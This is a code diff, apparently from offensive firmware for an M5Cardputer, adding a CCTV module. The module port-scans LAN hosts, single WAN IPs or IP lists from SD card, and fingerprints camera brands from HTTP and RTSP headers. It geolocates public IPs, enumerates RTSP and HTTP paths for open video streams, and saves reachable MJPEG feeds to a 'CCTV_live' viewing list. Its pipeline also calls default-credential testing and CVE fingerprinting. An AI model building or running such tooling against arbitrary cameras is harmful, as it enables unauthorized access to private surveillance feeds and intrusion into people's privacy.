+  String body = readBodyWithTimeout(client, 2048, 600);
+  client.stop();
+
+  bool headerSdp = (ct.indexOf("application/sdp") >= 0 || ct.endsWith("/sdp"));
+  bool looksSdp  = (body.indexOf("v=0") >= 0) && (body.indexOf("m=video") >= 0);
+  if (headerSdp && looksSdp) sdpOut = true;
+
+  return (codeOut > 0);
+}
+
+// Renvoie un nom de marque "propre" à partir du header RTSP "Server:"
+String normalizeRtspBrandFromServer(const String& srvRaw) {
+  String s = srvRaw; s.trim();
+  String low = s; low.toLowerCase();
+
+  if (low.indexOf("hipcam")        >= 0) return "Hipcam";
+  if (low.indexOf("tvt")           >= 0) return "TVT";
+  if (low.indexOf("ubnt")          >= 0 || low.indexOf("ubiquiti") >= 0) return "Ubiquiti";
+  if (low.indexOf("gstreamer")     >= 0) return "GStreamer";
+  if (low.indexOf("h264dvr")       >= 0) return "H264DVR";
+  if (low.indexOf("rtprtspflyer")  >= 0) return "RtpRtspFlyer";
+  if (low.indexOf("rtsp server")   >= 0 || low.indexOf("rtsp") >= 0) return "RTSP";
+
+  // fallback: renvoie tel quel si on ne connaît pas
+  return s.length() ? s : "RTSP";
+}
+
+bool isCamera(IPAddress ip, const std::vector<uint16_t>& ports, String& brandOut) {
+  uiPhase("Detecting camera");
+
+  // Liste des serveurs RTSP connus
+  const char* rtspServerNames[] = {
+    "H264DVR",
+    "Hipcam RealServer",
+    "TVT RTSP Server",
+    "GStreamer RTSP server",
+    "UBNT Streaming Server",
+    "RtpRtspFlyer",
+    "RTSP Server"
+  };
+
+  // Liste des commandes RTSP suffisantes pour considérer que c'est une caméra
+  const char* rtspCommands[] = {
+    "OPTIONS", "DESCRIBE", "PLAY", "PAUSE",
+    "SETUP", "TEARDOWN", "SET_PARAMETER", "GET_PARAMETER"
+  };
+
+  // 1) Détection via HTTP
+  for (uint16_t p : ports) {
+    String server, body;
+    if (httpRequest(ip, p, "/", server, body)) {
+      String lowServer = server; lowServer.toLowerCase();
+      String lowBody   = body;   lowBody.toLowerCase();
+
+      if (server.length()) {
+        Serial.printf("[FP] HTTP Server header from %s:%u → %s\n", ip.toString().c_str(), p, server.c_str());
+        logScanResult("[SERVER] HTTP " + ip.toString() + ":" + String(p) + " " + server);
+      }
+
+      if (headerContainsAny(lowServer, brandKeys_hikvision, sizeof(brandKeys_hikvision)/sizeof(brandKeys_hikvision[0]))) { brandOut = "Hikvision"; return true; }
+      if (headerContainsAny(lowServer, brandKeys_dahua,     sizeof(brandKeys_dahua)/sizeof(brandKeys_dahua[0])))         { brandOut = "Dahua";     return true; }
+      if (headerContainsAny(lowServer, brandKeys_axis,      sizeof(brandKeys_axis)/sizeof(brandKeys_axis[0])))          { brandOut = "Axis";      return true; }
+      if (headerContainsAny(lowServer, brandKeys_sony,      sizeof(brandKeys_sony)/sizeof(brandKeys_sony[0])))          { brandOut = "Sony";      return true; }
+      if (headerContainsAny(lowServer, brandKeys_bosch,     sizeof(brandKeys_bosch)/sizeof(brandKeys_bosch[0])))        { brandOut = "Bosch";     return true; }
+      if (headerContainsAny(lowServer, brandKeys_samsung,   sizeof(brandKeys_samsung)/sizeof(brandKeys_samsung[0])))    { brandOut = "Samsung";   return true; }
+      if (headerContainsAny(lowServer, brandKeys_panasonic, sizeof(brandKeys_panasonic)/sizeof(brandKeys_panasonic[0]))) { brandOut = "Panasonic"; return true; }
+      if (headerContainsAny(lowServer, brandKeys_vivotek,   sizeof(brandKeys_vivotek)/sizeof(brandKeys_vivotek[0])))    { brandOut = "Vivotek";   return true; }
+
+      if (lowBody.indexOf("cp plus")>=0 || lowBody.indexOf("cp-plus")>=0 || lowBody.indexOf("cpplus")>=0) {
+        brandOut = "CP Plus"; return true;
+      }
+
+      if (headerContainsAny(lowServer, brandKeys_generic, sizeof(brandKeys_generic)/sizeof(brandKeys_generic[0])) ||
+          lowBody.indexOf("camera")>=0 || lowBody.indexOf("webcam")>=0 ||
+          lowBody.indexOf("surveillance")>=0 || lowBody.indexOf("stream")>=0 || lowBody.indexOf("video")>=0) {
+        brandOut = "Unknown cam"; return true;
+      }
+    }
+
+    // 2) Détection via RTSP
+    if (p == 554 || p == 8554 || p == 10554 || p == 1554 || p == 2554 ||
+        p == 3554 || p == 4554 || p == 5554 || p == 6554 || p == 7554 || p == 9554) {
+
+      WiFiClient rtspCli;
+      if (rtspCli.connect(ip, p)) {
+        rtspCli.printf("OPTIONS rtsp://%s:%u/ RTSP/1.0\r\nCSeq: 1\r\n\r\n", ip.toString().c_str(), p);
+        unsigned long start = millis();
+        while (rtspCli.connected() && millis() - start < 500) {
+          while (rtspCli.available()) {
+            String line = rtspCli.readStringUntil('\n');
+            line.trim();
+
+            // Détection Server:
+            if (line.startsWith("Server:") || line.startsWith("server:")) {
+              String srv = line.substring(line.indexOf(':') + 1);
+              srv.trim();
+
+              // Log la valeur brute du header Server:
+              Serial.printf("[FP] RTSP Server header from %s:%u → %s\n", ip.toString().c_str(), p, srv.c_str());
+              logScanResult("[SERVER] RTSP " + ip.toString() + ":" + String(p) + " " + srv);
+
+              // Vérification des patterns connus
+              String srvLow = srv; srvLow.toLowerCase();
+              bool matched = false;
+              const char* matchedPattern = nullptr;
+
+              for (size_t i = 0; i < sizeof(rtspServerNames)/sizeof(rtspServerNames[0]); ++i) {
+                String ref = rtspServerNames[i]; ref.toLowerCase();
+                if (srvLow.indexOf(ref) >= 0) {
+                  matched = true;
+                  matchedPattern = rtspServerNames[i];
+                  break;
+                }
+              }
+              if (!matched && srvLow.indexOf("rtsp") >= 0) {
+                matched = true;
+                matchedPattern = "*rtsp*";
+              }
+
+              if (matched) {
+                String norm = normalizeRtspBrandFromServer(srv);
+                brandOut = norm;                       // <<—— donne “Hipcam”, “TVT”, “Ubiquiti”, etc.
+                uiAppend("Type: " + srv);             // affichage cohérent
+                Serial.printf("[BRAND] normalized RTSP brand → %s\n", norm.c_str());
+                logScanResult("[BRAND] " + norm);
+                rtspCli.stop();
+                return true;
+              }
+
+            }
+
+            // Détection Public:
+            if (line.startsWith("Public:") || line.startsWith("public:")) {
+              String pub = line.substring(line.indexOf(':') + 1);
+              pub.trim();
+              Serial.printf("[FP] RTSP Public from %s:%u → %s\n", ip.toString().c_str(), p, pub.c_str());
+
+              String pubLow = pub; pubLow.toLowerCase();
+              for (size_t i = 0; i < sizeof(rtspCommands)/sizeof(rtspCommands[0]); ++i) {
+                String cmd = rtspCommands[i]; cmd.toLowerCase();
+                if (pubLow.indexOf(cmd) >= 0) {
+                  Serial.printf("[MATCH] RTSP Public contains '%s' at %s:%u\n", rtspCommands[i], ip.toString().c_str(), p);
+                  logScanResult("[RTSP-PUBLIC] " + ip.toString() + ":" + String(p) +
+                                " contains " + rtspCommands[i]);
+                  uiAppend("Type: Camera (RTSP Public: " + String(rtspCommands[i]) + ")");
+                  brandOut = "RTSP Camera";
+                  rtspCli.stop();
+                  return true;
+                }
+              }
+            }
+          }
+        }
+        rtspCli.stop();
+      }
+    }
+
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return false;
+  }
+
+  return false;
+}
+
+
+/* ports "web-like" pour les HEAD HTTP rapides */
+bool isHttpLikePort(uint16_t p) {
+  if (isHttpsPort(p) || p == 80) return true;
+  if (p >= 8000 && p <= 8099) return true;
+  return false;
+}
+
+/* ---------- RTSP helpers: path aléatoire pour anti faux-positifs ---------- */
+String makeRandomInvalidRtspPath() {
+  // génère un chemin invalide style "/A1B2C3D4"
+  uint32_t r = (uint32_t)(millis() ^ random(0x7fffffff));
+  char buf[16];
+  snprintf(buf, sizeof(buf), "/%08lx", (unsigned long)r);
+  return String(buf);
+}
+
+// === CCTV_live auto-populate ===============================================
+static const char* const LIVE_LIST_PATH = "/evil/CCTV/CCTV_live.txt";
+
+bool fileContainsToken(const char* path, const String& token) {
+  File f = SD.open(path, FILE_READ);
+  if (!f) return false;
+  bool found = false;
+  while (f.available()) {
+    String line = f.readStringUntil('\n');
+    if (line.indexOf(token) >= 0) { found = true; break; }
+  }
+  f.close();
+  return found;
+}
+
+void ensureCCTVDir() {
+  if (!SD.exists("/evil/CCTV")) SD.mkdir("/evil/CCTV");
+  if (!SD.exists(LIVE_LIST_PATH)) {
+    File f = SD.open(LIVE_LIST_PATH, FILE_WRITE);
+    if (f) { f.println("# name | url"); f.close(); }
+  }
+}
+
+void appendMjpegToLiveList(const IPAddress& ip, uint16_t port) {
+  ensureCCTVDir();
+  String url  = "http://" + ip.toString() + ":" + String(port) + "/mjpg/video.mjpg";
+  // dédup: on déduplique sur l’URL
+  if (fileContainsToken(LIVE_LIST_PATH, url)) return;
+
+  File f = SD.open(LIVE_LIST_PATH, FILE_APPEND);
+  if (!f) f = SD.open(LIVE_LIST_PATH, FILE_WRITE);
+  if (f) {
+    String line = ip.toString() + " | " + url;
+    f.println(line);
+    f.close();
+    // facultatif: feedback discret à l’écran / log
+    uiAppend("[+] CCTV_live: " + line, false);
+    Serial.printf("[CCTV_LIVE] %s\n", line.c_str());
+  } else {
+    uiAppend("[x] Cannot write CCTV_live.txt", false);
+  }
+}
+void uiText(int x, int y, const char* s, uint32_t fg = TFT_WHITE, uint32_t bg = TFT_BLACK) {
+  M5.Display.setTextColor(fg, bg);
+  M5.Display.setCursor(x, y);
+  M5.Display.print(s);
+}
+
+void detectStreams(IPAddress ip, const std::vector<uint16_t>& ports) {
+  uiPhase("Checking streams");
+
+  // Chemins RTSP plausibles (réduits pour limiter le bruit)
+  static const char* rtspPaths[] = {
+    "/live", "/live.sdp", "/h264", "/h264.sdp", "/mpeg4",
+    "/stream1", "/stream2", "/main", "/sub",
+    "/1", "/ch0_0.264",
+    "/Streaming/Channels/1", "/Streaming/Channels/101",
+    "/onvif/streaming/channels/1",
+    "/axis-media/media.amp",
+    "/cam/realmonitor?channel=1&subtype=0"
+  };
+
+  // Chemins HTTP indicatifs (mjpeg/snapshot/etc.)
+  static const char* httpStreamPaths[] = {
+    "/video","/stream","/mjpg/video.mjpg","/cgi-bin/mjpg/video.cgi","/axis-cgi/mjpg/video.cgi",
+    "/cgi-bin/viewer/video.jpg","/snapshot.jpg","/img/snapshot.cgi","/onvif/device_service","/onvif/streaming"
+  };
+
+  int httpOk = 0, rtmpOk = 0;
+  std::vector<String> rtspFound;      // pour sauvegarde SD
+  std::vector<String> rtspProtected;  // 401 → utile à l’audit
+
+  // 1) RTSP : OPTIONS * puis DESCRIBE (avec anti faux-positifs)
+  for (uint16_t p : ports) {
+    bool isRtspPort = (p == 554 || p == 8554 || p == 10554 || p == 1554 || p == 2554 ||
+                       p == 3554 || p == 4554 || p == 5554 || p == 6554 || p == 7554 || p == 9554);
+    if (!isRtspPort) continue;
+
+    String publicHdr;
+    if (rtspServicePresent(ip, p, &publicHdr)) {
+      // Serial existant
+      Serial.printf("[RTSP] service present at %s:%u  %s\n",
+                    ip.toString().c_str(), p, publicHdr.length() ? publicHdr.c_str() : "");
+      logScanResult("[RTSP] service " + ip.toString() + ":" + String(p));
+      // Écran (même style)
+      uiAppend(String("[RTSP] service: ") + ip.toString() + ":" + String(p));
+      uiAppend(publicHdr.length() ? (publicHdr) : "");
+      uiAppend(" ");
+      // Anti faux-positifs : tester un chemin aléatoire incohérent
+      String garbage = makeRandomInvalidRtspPath();
+      int garbageCode = -1; bool garbageSdp = false;
+      if (rtspDescribe(ip, p, garbage.c_str(), garbageCode, garbageSdp) && garbageCode == 200 && garbageSdp) {
+        // Random path renvoie 200 (SDP) → faux positif probable
+        Serial.printf("[?] RTSP %s:%u%s -> 200 (SDP) on random path → check root / false positive likely\n",
+                      ip.toString().c_str(), p, garbage.c_str());
+        uiAppend("rtsp://" + String(ip.toString() + ":" + String(p) + garbage + " (200)"));
+        String genericRtsp = "rtsp://" + ip.toString() + ":" + String(p) + "/";
+        bool already = false;
+        for (const auto& u : rtspFound) { if (u == genericRtsp) { already = true; break; } }
+        if (!already) {
+          rtspFound.push_back(genericRtsp);
+          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + "/ 200/SDP");
+          uiAppend("rtsp://" + ip.toString() + ":" + String(p) + "/ -> 200 !");
+        }
+        if (g_scanFromSD) {
+          Serial.println("[RTSP] SD mode → auto-skip known paths (no popup).");
+          logScanResult("[RTSP] rtsp://" + ip.toString() + ":" + String(p) + "/");
+          goto AFTER_RTSP_PORT_SCAN;
+        } else {
+          // Interactif : proposer de continuer le crawl ou pas
+          bool go = confirmPopup("Random path returned 200\nFalse positive likely\nContinue crawling?");
+          if (!go) {
+            uiRefresh();
+            Serial.println("[RTSP] Known-paths scan canceled by user (anti false-positive).");
+            logScanResult("[RTSP] rtsp://" + ip.toString() + ":" + String(p) + "/");
+            goto AFTER_RTSP_PORT_SCAN;
+          }
+        }
+      }
+
+      // Tenter des DESCRIBE sur plusieurs chemins connus
+      for (const char* path : rtspPaths) {
+        int code = -1; bool sdp = false;
+        if (!rtspDescribe(ip, p, path, code, sdp)) continue;
+
+        if (code == 200 && sdp) {
+          // Serial + log
+          Serial.printf("[🎥] RTSP %s:%u%s -> 200 (SDP)\n",
+                        ip.toString().c_str(), p, path);
+          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + path + " 200/SDP");
+          // Écran + SD (liste)
+          uiAppend("rtsp://" + ip.toString() + ":" + String(p) + path + " -> 200");
+          rtspFound.push_back("rtsp://" + ip.toString() + ":" + String(p) + String(path));
+        } else if (code == 401) {
+          Serial.printf("[🔐] RTSP %s:%u%s -> 401 (auth required)\n",
+                        ip.toString().c_str(), p, path);
+          logScanResult("[RTSP] " + ip.toString() + ":" + String(p) + path + " 401");
+          uiAppend(ip.toString() + ":" + String(p) + path + " -> 401 (auth required)");
+          rtspProtected.push_back("rtsp://" + ip.toString() + ":" + String(p) + String(path) + "  [401]");
+        } else if (code > 0) {
+          Serial.printf("[ℹ] RTSP %s:%u%s -> %d\n", ip.toString().c_str(), p, path, code);
+        }
+
+        M5Cardputer.update();
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
+      }
+    }
+AFTER_RTSP_PORT_SCAN:
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
+  }
+
+  // 2) HTTP/HTTPS : HEAD rapides
+  for (uint16_t p : ports) {
+    if (!(isHttpsPort(p) || p == 80 || (p >= 8000 && p <= 8099))) continue;
+    for (const char* path : httpStreamPaths) {
+      HTTPClient http; WiFiClient cli; WiFiClientSecure tls;
+      String url = String(protoFromPort(p)) + "://" + ip.toString() + ":" + String(p) + path;
+      httpBeginAuto(http, cli, tls, url);
+      int code = http.sendRequest("GET");
+      if (code == 200) {
+        String ct = http.header("Content-Type"); String lct = ct; lct.toLowerCase();
+        bool looksVideo = false;
+        for (size_t i=0; i<NB_CT; i++) {
+          const char* sig = reinterpret_cast<const char*>(pgm_read_ptr(&camContentTypes[i]));
+          if (lct.indexOf(sig) >= 0) { looksVideo = true; break; }
+        }
+        // === AUTO-APPEND DANS CCTV_live.txt SI /mjpg/video.mjpg SUR HTTP ===
+        if (!isHttpsPort(p) && strcmp(path, "/mjpg/video.mjpg") == 0) {
+          appendMjpegToLiveList(ip, p);
+        }
+        if (looksVideo) {
+          Serial.printf("[🎥] %s  (%s)\n", url.c_str(), ct.c_str());
+          logScanResult("[STREAM] " + url + " (" + ct + ")");
+          httpOk++;
+        }
+      } else if (code == 400) {
+          Serial.printf("[x] %s  (400 Bad Request)\n", url.c_str());
+          logScanResult("[400] " + url);
+          http.end();
+          M5.Display.fillRect(0, 0, M5.Display.height(), 10, TFT_BLACK);
+          uiText(2, 0, "400 Bad Request", TFT_RED);
+          delay(1000);
+          return; // on quitte la détection et revient au menu
+      }
+      http.end();
+      M5Cardputer.update();
+      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
+          M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return;
+    }
+  }
+
+
+  // 3) RTMP : indicatif (ouvert/fermé)
+  for (uint16_t p : ports) {
+    if (p == 1935 || p == 1936 || p == 1937 || p == 1938 || p == 1939) {
+      if (isPortOpen(ip, p, 250)) {
+        Serial.printf("[📡] RTMP TCP open at %s:%u (manual test recommended)\n", ip.toString().c_str(), p);
+        logScanResult("[RTMP] " + ip.toString() + ":" + String(p));
+        rtmpOk++;
+      }
+    }
+  }
+
+  // —— Résumé UI concis
+  uiAppend("Streams: RTSP " + String(rtspFound.size()) +
+           "  HTTP " + String(httpOk) +
+           "  RTMP " + String(rtmpOk));
+
+  // —— Sauvegarde dans le rapport (fichier SD via uiEndHostAndSave)
+  if (!rtspFound.empty()) {
+    uiReportOnly("RTSP accessible paths:");
+    for (const String& u : rtspFound) uiReportOnly("  - " + u);
+  } else {
+    uiReportOnly("RTSP accessible paths: none");
+  }
+
+  if (!rtspProtected.empty()) {
+    uiReportOnly("RTSP protected (auth required):");
+    for (const String& u : rtspProtected) uiReportOnly("  - " + u);
+  }
+  delay(2000);
+}
+
+
+
+void showIpInfo(const String& publicIp) {
+  if (publicIp.startsWith("10.") || publicIp.startsWith("192.168.")) return; // privé
+  WiFiClientSecure tls;
+  tls.setInsecure();
+  HTTPClient http;
+  http.setTimeout(3000);
+  http.begin(tls, "https://ipinfo.io/" + publicIp + "/json");
+  int code = http.GET();
+  if (code == 200) {
+    DynamicJsonDocument doc(768);
+    deserializeJson(doc, http.getString());
+    const char* city    = doc["city"]    | "?";
+    const char* country = doc["country"] | "?";
+    Serial.printf("[🌍] City: %s  Country: %s\n", city, country);
+    if (doc["loc"]) {
+      String loc = doc["loc"].as<String>(); // lat,lon
+      Serial.printf("     Maps: https://www.google.com/maps?q=%s\n", loc.c_str());
+      uiAppend("Geo: " + String(city) + ", " + String(country));
+    } else {
+      uiAppend("Geo: " + String(city) + ", " + String(country));
+    }
+  }
+  http.end();
+}
+
+
+
+void processCCTVHost(const IPAddress& ip) {
+  uiBeginHost(ip);
+
+  // Geo (only for public IPs)
+  uiPhase("OSINT / GeoIP");
+  showIpInfo(ip.toString());
+
+  // 1) Ports
+  auto openPorts = scanCameraPorts(ip);
+  if (openPorts.empty()) {
+    Serial.printf("[INFO] No camera ports open on %s\n", ip.toString().c_str());
+    uiAppend("No camera ports open");
+    uiEndHostAndSave();
+    return;
+  }
+
+  // 2) Brand
+  String brand;
+  if (!isCamera(ip, openPorts, brand)) {
+    Serial.printf("[INFO] %s : not seem to be a camera (heuristics)\n", ip.toString().c_str());
+    uiAppend("Heuristics: not a camera?", false);
+  }
+
+  // Header line on TFT (small, concise)
+  M5.Display.setTextSize(1);
+  uiAppend("Targeting " + ip.toString() + " -> " + (brand.length()?brand:"(unknown)"), false);
+
+  // 3) Fingerprint + CVE
+  fingerprintCamera(ip, openPorts, brand);
+
+  // 4) Login pages
+  findLoginPages(ip, openPorts);
+
+  // 5) Default creds
+  testDefaultCreds(ip, openPorts);
+
+  // 6) Streams
+  detectStreams(ip, openPorts);
+
+  // Save summary to SD
+  uiEndHostAndSave();
+}
+
+
+/* ---------- Mode: scan local (LAN) ---------- */
+void scanCCTVCamerasLocal() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return; // retour au menu principal
+  }
+  local_scan_CCTV();   // Remplit hostslistCCTV par ARP
+  std::vector<IPAddress> hosts = hostslistCCTV;
+
+  if (hosts.empty()) {
+    waitAndReturnToMenu("No hosts to scan");
+    return;
+  }
+
+  for (const IPAddress& ip : hosts) {
+    processCCTVHost(ip);
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break; // retour menu
+  }
+  waitAndReturnToMenu("CCTV scan done");
+}
+
+/* ---------- Mode: IP unique (WAN) ---------- */
+void scanCCTVCamerasSingleIP() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  IPAddress target;
+  if (!promptIPv4(target)) {
+    waitAndReturnToMenu("Operation canceled");
+    return;
+  }
+
+  // Exécuter le même pipeline que pour un hôte LAN
+  processCCTVHost(target);
+  waitAndReturnToMenu("CCTV scan (single IP) done");
+}
+
+
+constexpr const char* CCTV_FILE = "/evil/CCTV/CCTV_IP.txt";
+
+bool loadIPsFromSD(const char* path, std::vector<IPAddress>& out) {
+  out.clear();
+  File f = SD.open(path, FILE_READ);
+  if (!f) {
+    Serial.printf("[!] File not found: %s\n", path);
+    return false;
+  }
+  int total = 0, ok = 0, bad = 0;
+  while (f.available()) {
+    String line = f.readStringUntil('\n');
+    line.trim();                 // supprime \r, espaces
+    if (line.length() == 0) { ++total; continue; }
+    IPAddress ip;
+    if (ip.fromString(line)) {
+      out.push_back(ip);
+      ++ok;
+    } else {
+      ++bad;
+      Serial.printf("[WARN] Ignoring invalid IP in file: %s\n", line.c_str());
+    }
+    ++total;
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
+  }
+  f.close();
+  Serial.printf("[INFO] Loaded %d IP(s) from %s (%d invalid)\n", ok, path, bad);
+  return !out.empty();
+}
+
+void scanCCTVCamerasFromFile() {
+  if (WiFi.localIP().toString() == "0.0.0.0") {
+    waitAndReturnToMenu("Not connected...");
+    return;
+  }
+
+  M5.Display.clear();
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(0, 0);
+  M5.Display.println("Loading IPs from SD…");
+  M5.Display.println(CCTV_FILE);
+  M5.Display.display();
+
+  std::vector<IPAddress> list;
+  if (!loadIPsFromSD(CCTV_FILE, list)) {
+    waitAndReturnToMenu("No IPs / file missing");
+    return;
+  }
+
+  // --- NEW: activer mode SD (batch) ---
+  g_scanFromSD = true;
+
+  Serial.printf("[INFO] Scanning %u target(s) from file\n", (unsigned)list.size());
+  int idx = 0;
+  for (const IPAddress& ip : list) {
+    ++idx;
+    uiBeginHost(ip);
+    uiPhase("From file (" + String(idx) + "/" + String((int)list.size()) + ")");
+    processCCTVHost(ip);
+
+    M5Cardputer.update();
+    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) break;
+  }
+
+  // --- NEW: désactiver mode SD avant de quitter ---
+  g_scanFromSD = false;
+
+  waitAndReturnToMenu("CCTV scan (file) done");
+}
+
+
+
+#include <M5GFX.h>
+#include <SPIFFS.h>
+#include <stdarg.h>
+
+// chemin du fichier liste
+static const char* CCTV_LIST_PATH = "/evil/CCTV/CCTV_live.txt";
+
+// résolutions proposées
+static const char* RES_LIST[] = { "160x120", "320x240"};
+static const int   RES_COUNT  = 2;
+
+// limites compression
+static const int   COMP_MIN = 0;
+static const int   COMP_MAX = 90;
+
+// timeouts réseau / io
+static const uint32_t CONNECT_TO_MS             = 8000; // TCP connect
+static const uint32_t RW_TIMEOUT_MS             = 8000; // socket timeout par défaut
+static const uint32_t READ_CHUNK_DEADLINE_MS    = 4000; // deadline par chunk
+static const uint32_t STREAM_READY_TIMEOUT_MS   = 5000; // 5s: aucune réponse/handshake
+static const uint32_t STREAM_NO_DATA_TIMEOUT_MS = 5000; // 5s: plus de data en lecture
+
+static const size_t   IO_CHUNK = 3840;
+
+// fichiers temporaires
+static const char* SD_TMP_DIR      = "/tmp";
+static const char* SD_FILE_A       = "/tmp/mjpeg_a.jpg";
+static const char* SD_FILE_B       = "/tmp/mjpeg_b.jpg";
+static const char* SPIFFS_FILE_A   = "/a.jpg";
+static const char* SPIFFS_FILE_B   = "/b.jpg";
+
+// écran Cardputer
+static const int SCREEN_W = 240;
+static const int SCREEN_H = 135;
+static const int TOPBAR_H = 12;
+//================================================
+
+// -------- état global sélection menu ----------
+static int  g_sel_stream  = 0;
+static int  g_sel_res_idx = 1; // 0:160x120, 1:320x240
+static int  g_sel_comp    = 70;
+
+// ---- sprite pour décoder puis étirer ----
+static LGFX_Sprite g_spr(&M5.Display);
+static bool   g_spr_ready = false;
+static int    g_spr_w = 0, g_spr_h = 0;
+
+// ---- logging ----
+#define MJLOG(...) do { Serial.printf("[MJPEG] " __VA_ARGS__); } while(0)
+
+void uiPrintf(int x, int y, uint32_t fg, const char* fmt, ...) {
+  char buf[160];
+  va_list ap; va_start(ap, fmt);
+  vsnprintf(buf, sizeof(buf), fmt, ap);
+  va_end(ap);
+  uiText(x, y, buf, fg);
+}
+
+// --------- NET UTILS ----------
+int readLineCCTV(WiFiClient& c, char* buf, size_t maxlen) {
+  int n = c.readBytesUntil('\n', buf, maxlen - 1);
+  if (n <= 0) {
+    buf[0] = 0;
+    return 0;
+  }
+  while (n > 0 && (buf[n - 1] == '\r' || buf[n - 1] == '\n')) n--;
+  buf[n] = 0;
+  return n;
+}
+size_t readN(WiFiClient& c, uint8_t* dst, size_t n, uint32_t deadline_ms) {
+  size_t got = 0; uint32_t last_progress = millis();
+  while (got < n) {
+    int r = c.read(dst + got, n - got);
+    if (r > 0) {
+      got += r;
+      last_progress = millis();
+    }
+    else {
+      if (millis() - last_progress > deadline_ms) break;
+      delay(1);
+    }
+  }
+  return got;
+}
+
+// ---------- URL ----------
+struct UrlParts {
+  String host, path;
+  uint16_t port = 80;
+  bool https = false;
+};
+bool parseUrl(const String& url, UrlParts& o) {
+  o = UrlParts{};
+  String u = url;
+  if (u.startsWith("https://")) {
+    o.https = true;
+    o.port = 443;
+    u.remove(0, 8);
+  }
+  else if (u.startsWith("http://")) {
+    u.remove(0, 7);
+  }
+  int slash = u.indexOf('/');
+  String hostport = (slash >= 0) ? u.substring(0, slash) : u;
+  o.path = (slash >= 0) ? u.substring(slash) : "/";
+  int colon = hostport.indexOf(':');
+  if (colon >= 0) {
+    o.host = hostport.substring(0, colon);
+    o.port = hostport.substring(colon + 1).toInt();
+  }
+  else o.host = hostport;
+  return o.host.length() > 0;
+}
+String extractBoundaryCI(const String& contentTypeRaw) {
+  String low = contentTypeRaw; low.toLowerCase();
+  int p = low.indexOf("boundary=");
+  if (p < 0) return "";
+  String val = contentTypeRaw.substring(p + 9);
+  int sc = val.indexOf(';'); if (sc >= 0) val = val.substring(0, sc);
+  val.trim();
+  if (val.startsWith("\"") && val.endsWith("\"") && val.length() >= 2) val = val.substring(1, val.length() - 1);
+  if (!val.startsWith("--")) val = "--" + val;
+  return val;
+}
+bool sniffBoundary(WiFiClient& client, String& boundary_out, char* lineBuf, size_t lineBufLen, int maxLines = 12) {
+  for (int i = 0; i < maxLines; ++i) {
+    int n = readLineCCTV(client, lineBuf, lineBufLen);
+    if (n <= 0) return false;
+    if (lineBuf[0] == '-' && lineBuf[1] == '-') {
+      boundary_out = String(lineBuf);
+      boundary_out.trim();
+      return true;
+    }
+  }
+  return false;
+}
+
+// -------- JPEG size parser (SOF) --------
+bool getJpegSize(fs::FS& fs, const char* path, int& outW, int& outH) {
+  File f = fs.open(path, FILE_READ); if (!f) return false;
+  auto read16 = [&](uint16_t &v)->bool { int a = f.read(), b = f.read(); if (a < 0 || b < 0) return false; v = ((uint16_t)a << 8) | b; return true; };
+uint16_t soi; if (!read16(soi) || soi != 0xFFD8) {
+    f.close();
+    return false;
+  }
+  while (true) {
+    int c; do {
+      c = f.read();
+      if (c < 0) {
+        f.close();
+        return false;
+      }
+    } while (c != 0xFF);
+    do {
+      c = f.read();
+      if (c < 0) {
+        f.close();
+        return false;
+      }
+    } while (c == 0xFF);
+    uint8_t marker = (uint8_t)c; if (marker == 0xD9 || marker == 0xDA) {
+      f.close();
+      return false;
+    }
+    uint16_t seglen; if (!read16(seglen) || seglen < 2) {
+      f.close();
+      return false;
+    }
+    if ((marker >= 0xC0 && marker <= 0xC3) || (marker >= 0xC5 && marker <= 0xC7) || (marker >= 0xC9 && marker <= 0xCB) || (marker >= 0xCD && marker <= 0xCF)) {
+      int p = f.read(); uint16_t h, w; if (p < 0 || !read16(h) || !read16(w)) {
+        f.close();
+        return false;
+      }
+      outW = (int)w; outH = (int)h; f.close(); return true;
+    } else {
+      f.seek(f.position() + ((uint32_t)seglen - 2));
+    }
+  }
+}
+
+// ---------- Sprite / affichage ----------
+void ensureSpriteSize(int w, int h) {
+  if (!g_spr_ready || w != g_spr_w || h != g_spr_h) {
+    if (g_spr_ready) g_spr.deleteSprite();
+    g_spr.setColorDepth(16);
+    g_spr.createSprite(w, h);
+    g_spr_ready = true; g_spr_w = w; g_spr_h = h;
+  }
+}
+void drawTopBar(const String& left, float fps) {
+  M5.Display.fillRect(0, 0, SCREEN_W, TOPBAR_H, TFT_BLACK);
+  M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
+  M5.Display.setCursor(2, 1);
+  M5.Display.print(left);
+  char f[20]; snprintf(f, sizeof(f), "%.1f FPS", fps);
+  int tw = M5.Display.textWidth(f);
+  M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
+  M5.Display.setCursor(SCREEN_W - tw - 2, 1);
+  M5.Display.print(f);
+}
+
+
+void drawScaledJpg(fs::FS& fs, const char* filepath) {
+  // Fenêtre utile
+  const int viewX = 0;
+  const int viewY = TOPBAR_H;
+  const int viewW = SCREEN_W;
+  const int viewH = SCREEN_H - TOPBAR_H;
+
+  int jw = 0, jh = 0;
+  if (!getJpegSize(fs, filepath, jw, jh)) return;   // ex: 320x240 ou 160x120
+
+  // --- cible de décodage unifiée : 160x120 ---
+  jpeg_div_t div = JPEG_DIV_NONE;
+  int cw = 160, ch = 120;   // TAILLE CONTENU EXACTE voulue après décodage
+
+  // Si la source est >= 320x240, on force une division par 2 -> 160x120 exact.
+  // Sinon (160x120), on garde DIV_NONE pour ne pas réduire.
+  if (jw >= 320 && jh >= 240) {
